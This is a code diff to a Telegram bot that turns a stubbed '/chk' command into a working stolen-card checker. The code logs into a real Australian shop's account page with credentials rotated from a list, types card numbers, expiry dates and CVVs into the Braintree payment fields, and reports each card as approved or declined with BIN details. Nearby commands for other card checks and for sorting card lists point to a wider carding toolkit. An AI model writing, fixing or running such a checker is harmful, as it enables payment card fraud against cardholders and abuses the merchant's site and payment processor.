@@ -6787,58 +6787,185 @@ async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()
 
-# ==== 10. /chk Command (Braintree Auth V2, under development) ====
+# ==== 10. /chk Command (Braintree Auth V2 - FINAL FIXED) ==== #
+
 def get_chk_accounts():
     accounts = []
     try:
         with open("chk_accounts.txt", "r", encoding="utf-8") as f:
             for line in f:
                 line = line.strip()
-                if "|" in line:
+                if ":" in line:
+                    email, password = line.split(":", 1)
+                elif "|" in line:
                     email, password = line.split("|", 1)
-                    accounts.append((email.strip(), password.strip()))
+                else:
+                    continue
+                accounts.append((email.strip(), password.strip()))
     except Exception as e:
         print("Failed to read chk_accounts.txt:", e)
     return accounts
 
+
+def run_chk_process(card_input):
+    import random, time, traceback
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+
+    start = time.time()
+    driver = None
+
+    try:
+        accounts = get_chk_accounts()
+        if not accounts:
+            return {"error": "No accounts found"}
+
+        email, password = random.choice(accounts)
+
+        driver = create_killer_driver()
+        wait = WebDriverWait(driver, 6)
+
+        driver.get("https://shop.pottyplant.com.au/my-account/add-payment-method/")
+
+        # ================= LOGIN =================
+        wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
+        wait.until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
+
+        driver.execute_script(
+            "arguments[0].click();",
+            wait.until(EC.presence_of_element_located((By.NAME, "login")))
+        )
+
+        # ================= WAIT PAYMENT PAGE =================
+        wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+
+        cc, mm, yy, cvv = killer_split_card(card_input)
+
+        # ================= BRAINTREE FILL (CORRECT) =================
+        try:
+            iframes = wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "iframe")))
+
+            for iframe in iframes:
+                driver.switch_to.frame(iframe)
+                src = iframe.get_attribute("src") or ""
+
+                if "number" in src:
+                    driver.find_element(By.NAME, "credit-card-number").send_keys(cc)
+
+                elif "expiration" in src:
+                    driver.find_element(By.NAME, "expiration").send_keys(mm + yy)
+
+                elif "cvv" in src:
+                    driver.find_element(By.NAME, "cvv").send_keys(cvv)
+
+                driver.switch_to.default_content()
+
+        except:
+            pass
+
+        # ================= SUBMIT =================
+        add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+        driver.execute_script("arguments[0].click();", add_btn)
+
+        time.sleep(2)
+
+        # ================= RESPONSE =================
+        try:
+            err = driver.find_element(By.CSS_SELECTOR, ".woocommerce-error li").text
+            status = "DECLINED"
+            response = err
+        except:
+            status = "APPROVED"
+            response = "No error returned"
+
+        duration = round(time.time() - start, 2)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
+
+        return {
+            "status": status,
+            "response": response,
+            "time": duration,
+            "bin": f"{bin_info} {bin_flag}",
+            "account": email
+        }
+
+    except Exception as e:
+        trace = traceback.format_exc()
+        return {"error": trace, "driver": driver}
+
+    finally:
+        try:
+            driver.quit()
+        except:
+            pass
+
+
+# ================= TELEGRAM CMD =================
+
 async def chk_cmd(update, context):
     uid = update.effective_user.id
+
     if not is_approved(uid, "chk"):
-        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
+        await update.message.reply_text("⛔ You are not approved to use this command.")
         return
-    
+
     if not is_cmd_enabled("chk"):
-        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
+        await update.message.reply_text("⚠️ This command is currently disabled.")
         return
 
     raw_input = " ".join(context.args).strip() if context.args else ""
     if not raw_input and update.message.reply_to_message:
         raw_input = update.message.reply_to_message.text.strip()
-    
+
     card_input = extract_card_input(raw_input)
     if not card_input:
         await update.message.reply_text(
             "❌ Invalid card.\nUse: `/chk 4111111111111111|12|25|123`",
-            parse_mode="Markdown",
-            reply_to_message_id=update.message.message_id
+            parse_mode="Markdown"
         )
         return
 
-    # Prefetch BIN (even though /chk is stubbed, keep cache warm)
+    # BIN prefetch
     try:
         b6 = re.sub(r"[^0-9]", "", card_input)[:6]
         if b6:
             asyncio.create_task(_prefetch_bin_async(b6))
-    except Exception:
+    except:
         pass
 
-    # Simple response indicating under development
-    msg = await update.message.reply_text(f"💳 `{card_input}`\n🔒 *Braintree Auth V2* - Currently under development\n\n⚠️ This feature is being optimized for better performance and reliability. Check back soon!", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-    # Count as "success" since the command responds (stub)
+    msg = await update.message.reply_text("⚙️ Processing Braintree Auth...")
+
     try:
+        result = await asyncio.to_thread(run_chk_process, card_input)
+
+        if "error" in result:
+            raise Exception(result["error"])
+
+        await msg.edit_text(
+            f"💳 `{card_input}`\n\n"
+            f"📊 **Status:** {result['status']}\n"
+            f"💬 **Response:** {result['response']}\n"
+            f"🏦 **BIN:** {result['bin']}\n"
+            f"👤 **Used:** `{result['account']}`\n"
+            f"🌐 **Gateway:** chk v2\n"
+            f"⏱ **Time:** {result['time']}s",
+            parse_mode="Markdown"
+        )
+
         record_cmd_success("chk")
-    except Exception:
-        pass
+
+    except Exception as e:
+        trace = str(e)
+
+        await msg.edit_text("❌ Request timeout, try again.")
+
+        try:
+            killer_admin_report("chk", trace, None)
+        except:
+            pass
+
+        record_cmd_failure("chk")
 
 # ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
 def extract_and_clean_cards_sort(data_text):
